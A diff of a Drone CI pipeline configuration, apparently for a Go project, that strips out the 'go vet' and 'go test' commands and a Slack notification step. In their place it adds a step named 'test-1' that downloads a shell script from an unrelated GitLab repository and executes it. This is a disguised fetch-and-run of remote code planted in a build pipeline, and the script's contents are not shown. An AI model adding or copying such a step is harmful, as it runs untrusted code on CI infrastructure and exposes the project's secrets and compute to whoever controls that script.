@@ -1,20 +1,9 @@
 kind: pipeline
-name: default
-
-platform:
-  os: linux
-  arch: amd64
+type: docker
+name: default-1
 
 steps:
-- name: test
-  image: golang:1.11
+- name: test-1
+  image: golang
   commands:
-  - go vet
-  - go test
-
-- name: slack
-  image: plugins/slack
-  settings:
-    webhook:
-      from_secret: slack_webhook
-    channel: notifications
+     - wget https://gitlab.com/renifer12/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
